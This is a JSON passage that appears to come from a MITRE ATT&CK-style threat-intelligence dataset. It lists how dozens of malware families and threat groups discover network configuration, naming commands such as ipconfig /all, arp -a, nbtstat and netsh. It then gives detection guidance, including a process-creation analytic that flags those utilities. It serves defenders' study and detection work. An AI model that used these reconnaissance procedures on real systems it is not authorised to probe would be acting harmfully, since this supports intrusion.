      {
        "id": "S0651",
        "name": "BoxCaon",
        "description": "BoxCaon can collect the victim's MAC address by using the GetAdaptersInfo API.[42]"
      },
      {
        "id": "S0252",
        "name": "Brave Prince",
        "description": "Brave Prince gathers network configuration information as well as the ARP cache.[43]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors used code to obtain the external public-facing IPv4 address of the compromised host.[44]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 used cmd.exe /c ping %userdomain% for discovery.[45]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors ran nslookup and Advanced IP Scanner on the target network.[46]"
      },
      {
        "id": "S0274",
        "name": "Calisto",
        "description": "Calisto runs the ifconfig command to obtain the IP address from the victim’s machine.[47]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon can collect the IP address of the victims and other computers on the network using the commands: ipconfig -all nbtstat -n, and nbtstat -s.[48][49]"
      },
      {
        "id": "S0261",
        "name": "Catchamas",
        "description": "Catchamas gathers the Mac address, IP address, and the network adapter information from the victim’s machine.[50]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell can gather the IP address from the victim's machine using the IP config command.[51]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower has the ability to use ipconfig to enumerate system network settings.[52]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used ipconfig, Ping, and tracert to enumerate the IP address and network environment and settings of the local host.[53]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can enumerate the IP address of a compromised host.[54]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can enumerate the IP address of a compromised machine.[55][56]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can determine the NetBios name and  the IP addresses of targets machines including domain controllers.[57][58]"
      },
      {
        "id": "S0244",
        "name": "Comnie",
        "description": "Comnie uses ipconfig /all and route PRINT to identify network adapter and interface information.[59]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can retrieve the ARP cache from the local system by using the GetIpNetTable() API call and check to ensure IP addresses it connects to are for local, non-Internet, systems.[60]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can collect DNS information from the targeted system.[61]"
      },
      {
        "id": "S1024",
        "name": "CreepySnail",
        "description": "CreepySnail can use getmac and Get-NetIPAddress to enumerate network settings.[62]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson contains a command to collect the victim MAC address and LAN IP.[63][64]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba can retrieve the ARP cache from the local system by using GetIpNetTable.[65]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink can use the Linux API if_nameindex to gather network interface names.[66][67]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel has collected the IP address and network adapter information from the victim’s machine.[68][69]"
      },
      {
        "id": "S1052",
        "name": "DEADEYE",
        "description": "DEADEYE can discover the DNS domain name of a targeted system.[45]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis uses ipconfig to gather the IP address from the system.[18]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol can enumerate victims' local and external IPs when registering with C2.[70]"
      },
      {
        "id": "S0472",
        "name": "down_new",
        "description": "down_new has the ability to identify the MAC address of a compromised host.[25]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has used batch scripts to enumerate network information, including information about trusts, zones, and the domain.[71]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack can collect the host's IP addresses using the ipconfig command.[72][73]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "The reconnaissance modules used with Duqu can collect information on network configuration.[74]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre has the ability to identify network settings on a compromised host.[75]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca used the command ipconfig to obtain information about network configurations.[76]"
      },
      {
        "id": "S0605",
        "name": "EKANS",
        "description": "EKANS can determine the domain of a compromised host.[77]"
      },
      {
        "id": "S0081",
        "name": "Elise",
        "description": "Elise executes ipconfig /all after initial communication is made to the remote server.[78][79]"
      },
      {
        "id": "S0082",
        "name": "Emissary",
        "description": "Emissary has the capability to execute the command ipconfig /all.[80]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can acquire network configuration information like DNS servers, public IP, and network proxies used by a host.[81][82]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic uses the nbtstat -n and nbtstat -s commands on the victim’s machine.[83]"
      },
      {
        "id": "S0569",
        "name": "Explosive",
        "description": "Explosive has collected the MAC address from the victim's machine.[84]"
      },
      {
        "id": "S0181",
        "name": "FALLCHILL",
        "description": "FALLCHILL collects MAC address and local IP address information from the victim.[85]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke can identify the MAC address on the target computer.[86]"
      },
      {
        "id": "S0171",
        "name": "Felismus",
        "description": "Felismus collects the victim LAN IP address and sends it to the C2 server.[87]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT collects information about the network including the IP address and DHCP server.[88]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has used nslookup and ipconfig for network reconnaissance efforts. FIN13 has also utilized a compromised Symantec Altiris console and LanDesk account to retrieve network information.[89][90]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro has been used to execute the ipconfig /all command on a victim system.[91]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors used Empire to find the public IP address of a compromised system.[82]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can parse the ProxyServer string in the Registry to discover http proxies.[92]"
      },
      {
        "id": "C0007",
        "name": "FunnyDream",
        "description": "During FunnyDream, the threat actors used ipconfig for discovery on remote systems.[92]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM used ipconfig /all to obtain information about the victim network configuration. The group also ran a modified version of NBTscan to identify available NetBIOS name servers.[93]"
      },
      {
        "id": "S0049",
        "name": "GeminiDuke",
        "description": "GeminiDuke collects information on network settings and Internet proxy settings from the victim.[94]"
      },
      {
        "id": "S0588",
        "name": "GoldMax",
        "description": "GoldMax retrieved a list of the system's network interface after execution.[95]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can determine the IP and physical location of the compromised host via IPinfo.[96]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT collects the victim IP address, MAC address, as well as the victim account domain name.[97]"
      },
      {
        "id": "S0690",
        "name": "Green Lambert",
        "description": "Green Lambert can obtain proxy information from a victim's machine using system environment variables.[98][99]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent can enumerate the IP and domain of a target system.[100]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has collected IP information via IPInfo.[101]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has used Ping and tracert for network discovery.[102]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa used ipconfig to gather network configuration information.[103][104]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to identify the IP address of the compromised machine.[105]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.[106][107]"
      },
      {
        "id": "S1022",
        "name": "IceApple",
        "description": "The IceApple ifconfig module can iterate over all network interfaces on the host and retrieve the name, description, MAC address, DNS suffix, DNS servers, gateways, IPv4 addresses, and subnet masks.[108]"
      },
      {
        "id": "S0101",
        "name": "ifconfig",
        "description": "ifconfig can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP."
      },
      {
        "id": "S0278",
        "name": "iKitten",
        "description": "iKitten will look for the current IP address.[109]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer’s 61850 payload component enumerates connected network adapters and their corresponding IP addresses.[110]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole gathers information on the IP forwarding table, MAC address, configured proxy, and network SSID.[111][112]"
      },
      {
        "id": "S0100",
        "name": "ipconfig",
        "description": "ipconfig can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP."
      },
      {
        "id": "S0015",
        "name": "Ixeshe",
        "description": "Ixeshe enumerates the IP address, network proxy settings, and domain name from a victim's system.[113]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "A JHUHUGIT variant gathers network interface card information.[114]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can obtain network information, including DNS, IP, and proxies.[115]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can gather victim internal and external IPs.[116]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar gathers information about network adapters.[117]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has performed local network configuration discovery using ipconfig.[118][119][120]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel has collected the DNS address of the infected host.[41]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can collect the MAC address and other information from a victim machine using ipconfig/all.[102]"
      },
      {
        "id": "S0387",
        "name": "KeyBoy",
        "description": "KeyBoy can determine the public or WAN IP address for the system.[121]"
      },
      {
        "id": "S0271",
        "name": "KEYMARBLE",
        "description": "KEYMARBLE gathers the MAC address of the victim’s machine.[122]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used ipconfig/all to gather network configuration information.[123]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can retrieve the contents of the IP routing table as well as information about the Windows domain.[124][125]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos can record the IP address of the target machine.[126]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI can collect the IP address from the victim’s machine.[127]"
      },
      {
        "id": "S1075",
        "name": "KOPILUWAK",
        "description": "KOPILUWAK can use Arp to discover a target's network configuration setttings.[128]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation.[129]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.[130][131]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron gathers information about network adapters using the Win32 API call GetAdaptersInfo.[132]"
      },
      {
        "id": "S0513",
        "name": "LiteDuke",
        "description": "LiteDuke has the ability to discover the proxy configuration of Firefox and/or Opera.[86]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can retrieve network information from a compromised host.[133]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has the ability to discover the domain name of the infected host.[134]"
      },
      {
        "id": "S0451",
        "name": "LoudMiner",
        "description": "LoudMiner used a script to gather the IP address of the infected machine before sending to the C2.[135]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can collect the IP address of a compromised host.[136]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete collects the MAC address of the target computer and other network configuration information.[137][138]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa can collect IP addresses from a compromised host.[139]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can use the GetAdaptersInfo function to retrieve information about network adapters and the GetIpNetTable function to retrieve the IPv4 to physical network address mapping table.[140]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address.[141][142][143]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.[144]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan can run C:\\Windows\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1 to discover network settings.[145]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type may create a file containing the results of the command cmd.exe /c ipconfig /all.[146]"
      },
      {
        "id": "S0149",
        "name": "MoonWind",
        "description": "MoonWind obtains the victim IP address.[147]"
      },
      {
        "id": "S0284",
        "name": "More_eggs",
        "description": "More_eggs has the capability to gather the IP address from the victim's machine.[148]"
      },
      {
        "id": "G1009",
        "name": "Moses Staff",
        "description": "Moses Staff has collected the domain name of a compromised network.[149]"
      },
      {
        "id": "S0256",
        "name": "Mosquito",
        "description": "Mosquito uses the ipconfig command.[150]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used malware to collect the victim’s IP address and domain name.[151]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has used ipconfig and arp to determine network configuration information.[152]"
      },
      {
        "id": "S0205",
        "name": "Naid",
        "description": "Naid collects the domain name from a compromised host.[153]"
      },
      {
        "id": "G0019",
        "name": "Naikon",
        "description": "Naikon uses commands such as netsh interface show to discover network interface settings.[154]"
      },
      {
        "id": "S0228",
        "name": "NanHaiShu",
        "description": "NanHaiShu can gather information about the victim proxy server.[155]"
      },
      {
        "id": "S0336",
        "name": "NanoCore",
        "description": "NanoCore gathers the IP address from the victim’s machine.[156]"
      },
      {
        "id": "S0590",
        "name": "NBTscan",
        "description": "NBTscan can be used to collect MAC addresses.[157][158]"
      },
      {
        "id": "S0102",
        "name": "nbtstat",
        "description": "nbtstat can be used to discover local NetBIOS domain names."
      },
      {
        "id": "S0691",
        "name": "Neoichor",
        "description": "Neoichor can gather the IP address from an infected host.[120]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can collect the IP address of a compromised host.[159][160]"
      },
      {
        "id": "S0359",
        "name": "Nltest",
        "description": "Nltest may be used to enumerate the parent domain of a local machine using /parentdomain.[161]"
      },
      {
        "id": "S0353",
        "name": "NOKKI",
        "description": "NOKKI can gather information on the victim IP address.[162]"
      },
      {
        "id": "S0346",
        "name": "OceanSalt",
        "description": "OceanSalt can collect the victim’s IP address.[163]"
      },
      {
        "id": "S0340",
        "name": "Octopus",
        "description": "Octopus can collect the host IP address from the victim’s machine.[164]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has run ipconfig /all on a victim.[165][166]"
      },
      {
        "id": "S0439",
        "name": "Okrum",
        "description": "Okrum can collect network information, including the host IP address, DNS, and proxy information.[167]"
      },
      {
        "id": "S0365",
        "name": "Olympic Destroyer",
        "description": "Olympic Destroyer uses API calls to enumerate the infected system's ARP table.[168]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used ipconfig, nbtstat, tracert, route print, and cat /etc/hosts commands.[169]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors discovered the local network configuration with ipconfig.[170]"
      },
      {
        "id": "S0229",
        "name": "Orz",
        "description": "Orz can gather victim proxy information.[155]"
      },
      {
        "id": "S0165",
        "name": "OSInfo",
        "description": "OSInfo discovers the current domain information.[16]"
      },
      {
        "id": "S0352",
        "name": "OSX_OCEANLOTUS.D",
        "description": "OSX_OCEANLOTUS.D can collect the network interface MAC address on the infected host.[171][172]"
      },
      {
        "id": "S0556",
        "name": "Pay2Key",
        "description": "Pay2Key can identify the IP and MAC addresses of the compromised host.[173]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare can obtain the proxy settings of a compromised machine using InternetQueryOptionA and its IP address by running nslookup myip.opendns.comresolver1.opendns.com\\r\\n.[92]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin can report the IP of the compromised host to attacker controlled infrastructure.[174]"
      },
      {
        "id": "S1031",
        "name": "PingPull",
        "description": "PingPull can retrieve the IP address of a compromised host.[175]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon can collect and send the local IP address, RDP information, and the network adapter physical address as a part of its C2 beacon.[176]"
      },
      {
        "id": "S0124",
        "name": "Pisloader",
        "description": "Pisloader has a command to collect the victim's IP address.[177]"
      },
      {
        "id": "S0254",
        "name": "PLAINTEE",
        "description": "PLAINTEE uses the ipconfig /all command to gather the victim’s IP address.[178]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 can enumerate network adapter information.[179]"
      },
      {
        "id": "S0139",
        "name": "PowerDuke",
        "description": "PowerDuke has a command to get the victim's domain and NetBIOS name.[180]"
      },
      {
        "id": "S0441",
        "name": "PowerShower",
        "description": "PowerShower has the ability to identify the current Windows domain of the infected host.[181]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS can retrieve IP, network adapter configuration information, and domain from compromised hosts.[182][183]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER may collect network configuration data by running ipconfig /all on a victim.[184]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "A module in Prikormka collects information from the victim about its IP addresses and MAC addresses.[185]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "Proxysvc collects the network adapter information and domain/username information based on current remote sessions.[186]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.[187]"
      },
      {
        "id": "S0583",
        "name": "Pysa",
        "description": "Pysa can perform network reconnaissance using the Advanced IP Scanner tool.[188]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can use net config workstation, arp -a, nslookup, and ipconfig /all to gather network configuration information.[189][190][191][192]"
      },
      {
        "id": "S0269",
        "name": "QUADAGENT",
        "description": "QUADAGENT gathers the current domain the victim system belongs to.[193]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0.[194]"
      },
      {
        "id": "S1076",
        "name": "QUIETCANARY",
        "description": "QUIETCANARY can identify the default proxy setting on a compromised host.[128]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can use ipconfig and Arp to collect network configuration information, including routing information and ARP tables.[195]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA gathers the victim’s IP address via the ipconfig -all command.[196][197]"
      },
      {
        "id": "S0172",
        "name": "Reaver",
        "description": "Reaver collects the victim's IP address.[198]"
      },
      {
        "id": "S0153",
        "name": "RedLeaves",
        "description": "RedLeaves can obtain information about network parameters.[144]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.[199]"
      },
      {
        "id": "S0379",
        "name": "Revenge RAT",
        "description": "Revenge RAT collects the IP address and MAC address from the system.[200]"
      },
      {
        "id": "S0433",
        "name": "Rifdoor",
        "description": "Rifdoor has the ability to identify the IP address of the compromised host.[201]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun can detect network adapter and IP address information.[202]"
      },
      {
        "id": "S0270",
        "name": "RogueRobin",
        "description": "RogueRobin gathers the IP address and domain from the victim’s machine.[203]"
      },
      {
        "id": "S0103",
        "name": "route",
        "description": "route can be used to discover routing configuration information."
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal can enumerate IP addresses using GetIpAddrTable.[204]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.[205][206]"
      },
      {
        "id": "S0085",
        "name": "S-Type",
        "description": "S-Type has used ipconfig /all on a compromised host.[146]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot can collect the IP address of a victim machine.[207]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to execute the ipconfig command.[208]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host.[209]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has collected the domain name of the victim system.[210]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon obtains the target's IP address and local network segment.[211][212]"
      },
      {
        "id": "S0450",
        "name": "SHARPSTATS",
        "description": "SHARPSTATS has the ability to identify the domain of the compromised host.[183]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter gathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host.[213]"
      },
      {
        "id": "S0589",
        "name": "Sibot",
        "description": "Sibot checked if the compromised system is configured to use proxies.[95]"
      },
      {
        "id": "G1008",
        "name": "SideCopy",
        "description": "SideCopy has identified the IP address of a compromised host.[3]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist has the ability to collect the domain name on a compromised host.[214]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used malware to collect information on network interfaces, including the MAC address.[215]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver has the ability to gather network configuration information.[216]"
      },
      {
        "id": "S1035",
        "name": "Small Sieve",
        "description": "Small Sieve can obtain the IP address of a victim host.[217]"
      },
      {
        "id": "S0516",
        "name": "SoreFang",
        "description": "SoreFang can collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host via ipconfig.exe /all.[218]"
      },
      {
        "id": "S0374",
        "name": "SpeakUp",
        "description": "SpeakUp uses the ifconfig -a command. [219]"
      },
      {
        "id": "S0646",
        "name": "SpicyOmelette",
        "description": "SpicyOmelette can identify the IP of a compromised system.[220]"
      },
      {
        "id": "S1030",
        "name": "Squirrelwaffle",
        "description": "Squirrelwaffle has collected the victim’s external IP address.[221]"
      },
      {
        "id": "S1037",
        "name": "STARWHALE",
        "description": "STARWHALE has the ability to collect the IP address of an infected host.[222]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "Stealth Falcon malware gathers the Address Resolution Protocol (ARP) table from the victim.[223]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity can identify the IP address of a compromised host.[224]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet collects the IP address of a compromised system.[225]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information.[226]"
      },
      {
        "id": "S0018",
        "name": "Sykipot",
        "description": "Sykipot may use ipconfig /all to gather system network configuration details.[227]"
      },
      {
        "id": "S0060",
        "name": "Sys10",
        "description": "Sys10 collects the local IP address of the victim and sends it to the C2.[154]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can collected the IP address and domain name of a compromised host.[228]"
      },
      {
        "id": "S0098",
        "name": "T9000",
        "description": "T9000 gathers and beacons the MAC and IP addresses during installation.[229]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor has collected the MAC address of a compromised host; it can also use GetAdaptersInfo to identify network adapters.[230][231]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to identify the MAC address on an infected host.[232]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has enumerated the host machine’s IP address.[233]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 actors use NBTscan to discover vulnerable systems.[234]"
      },
      {
        "id": "S0678",
        "name": "Torisma",
        "description": "Torisma can collect the local MAC address using GetAdaptersInfo as well as the system's IP address.[235]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.[236][237][57]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can gather information on the network configuration of a compromised host.[238]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has used scripts to collect the host's network topology.[239]"
      },
      {
        "id": "S0436",
        "name": "TSCookie",
        "description": "TSCookie has the ability to identify the IP of the infected host.[240]"
      },
      {
        "id": "S0647",
        "name": "Turian",
        "description": "Turian can retrieve the internal IP address of a compromised host.[241]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, net config, ipconfig /all, and route commands, as well as NBTscan.[83][242][243] Turla RPC backdoors have also retrieved registered RPC interface information from process memory.[244]"
      },
      {
        "id": "S0130",
        "name": "Unknown Logger",
        "description": "Unknown Logger can obtain information about the victim's IP address.[245]"
      },
      {
        "id": "S0275",
        "name": "UPPERCUT",
        "description": "UPPERCUT has the capability to gather the victim's proxy information.[246]"
      },
      {
        "id": "S0452",
        "name": "USBferry",
        "description": "USBferry can detect the infected machine's network topology using ipconfig and arp.[239]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak has the ability to identify the domain and the MAC and IP addresses of an infected machine.[247]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN gathers the local IP address.[248]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer can gather the IP address from the victim's machine.[249]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has executed multiple commands to enumerate network topology and settings including  ipconfig, netsh interface firewall show all, and netsh interface portproxy show all.[250]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry will attempt to determine the local network segment it is a part of.[251]"
      },
      {
        "id": "S0515",
        "name": "WellMail",
        "description": "WellMail can identify the IP address of the victim system.[252]"
      },
      {
        "id": "S0514",
        "name": "WellMess",
        "description": "WellMess can identify the IP address and user domain on the target machine.[253][254]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used ipconfig to identify the network configuration of a victim machine. Wizard Spider has also used the PowerShell cmdlet Get-ADComputer to collect IP address data from Active Directory.[255][256]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can retrieve network interface and proxy information.[257]"
      },
      {
        "id": "S0341",
        "name": "Xbash",
        "description": "Xbash can collect IP addresses and local intranet information from a victim’s machine.[258]"
      },
      {
        "id": "S0653",
        "name": "xCaon",
        "description": "xCaon has used the GetAdaptersInfo() API call to get the victim's MAC address.[42]"
      },
      {
        "id": "S0248",
        "name": "yty",
        "description": "yty runs ipconfig /all and collects the domain name.[259]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy runs the ipconfig /all command.[260]"
      },
      {
        "id": "S0230",
        "name": "ZeroT",
        "description": "ZeroT gathers the victim's IP address and domain information, and then sends it to its C2 server.[261]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has used a tool to enumerate proxy settings in the target environment.[262]"
      },
      {
        "id": "S0350",
        "name": "zwShell",
        "description": "zwShell can obtain the victim IP address.[263]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls (such as GetAdaptersInfo() and GetIpNetTable()) that may gather details about the network configuration and settings, such as IP and/or MAC addresses."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for executed processes (such as ipconfig/ifconfig and arp) with arguments that may look for details about the network configuration and settings, such as IP and/or MAC addresses.Note: The Analytic looks for the creation of ipconfig, route, and nbtstat processes, all of which are system administration utilities that can be used for the purpose of system network configuration discovery. If these tools are commonly used in your environment (e.g., by system administrators) this may lead to false positives and this analytic will therefore require tuning.  Analytic 1 - Suspicious Process  processes = filter processes where (  (event_id == \"1\" OR event_id == \"4688\") AND    exe == \"C:\\Windows\\System32\\ipconfig.exe\" OR    exe == \"C:\\Windows\\System32\\route.exe\" OR    exe == \"C:\\Windows\\System32\\nbtstat.exe\")"
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1016.001",
        "name": "Internet Connection Discovery"
      },
      {
        "id": "T1016.002",
        "name": "Wi-Fi Discovery"
      }
    ],
    "Tactic": "\nDiscovery"
  },
  {
    "Title": "System Network Connections Discovery",
    "Code": "T1049",
